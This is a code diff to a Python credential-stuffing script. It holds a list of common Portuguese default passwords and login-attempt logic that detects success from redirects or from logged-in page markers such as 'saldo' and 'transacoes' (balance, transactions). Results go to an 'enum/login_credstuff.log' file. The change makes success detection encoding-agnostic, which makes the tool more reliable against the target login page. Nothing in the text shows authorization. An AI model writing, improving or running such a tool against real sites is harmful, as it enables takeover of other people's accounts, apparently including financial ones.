@@ -40,15 +40,17 @@ PASSWORDS = [
     "changepassword","mudar123","Mudar@123","senha123","Senha@123",
 ]
 
-FAIL_MARKERS = ["não confere","nao confere","senha não confere","incorret","invalid"]
+FAIL_MARKERS_B = [b"confere", b"nao confere", b"incorret", b"invalid"]  # bytes, encoding-agnostic
+PANEL_MARKERS_B = [b"/painel", b"/sair", b"logout", b"minha conta", b"/notificacoes",
+                   b"bem-vindo", b"bem vindo", b"Logado", b"Sair", b"saldo", b"transacoes"]
 
-def is_success(status, location, body):
+def is_success(status, location, body_b):
     if status in (302,303,307,308) and location and "/login" not in location.lower():
         return True
     if status==200:
-        if not any(m in body for m in FAIL_MARKERS):
+        if not any(m in body_b for m in FAIL_MARKERS_B):
             # checar se tem painel/logado
-            if any(s in body for s in ["painel","/sair","logout","minha conta","/notificacoes","bem-vindo","bem vindo","Logado","Sair","saldo"]):
+            if any(s in body_b for s in PANEL_MARKERS_B):
                 return True
     return False
 
@@ -67,9 +69,9 @@ def try_one(user, pw):
     except Exception as e:
         return None, f"POST exc {type(e).__name__}"
     loc=r.headers.get("Location","")
-    body=r.text[:2000]
-    ok=is_success(r.status_code,loc,body)
-    return ok, f"HTTP {r.status_code} loc={loc[:50]!r} fail_msg={'não confere' in body}"
+    body_b=r.content[:3000]
+    ok=is_success(r.status_code,loc,body_b)
+    return ok, f"HTTP {r.status_code} loc={loc[:50]!r} fail_msg={b'confere' in body_b}"
 
 def main():
     out="enum/login_credstuff.log"
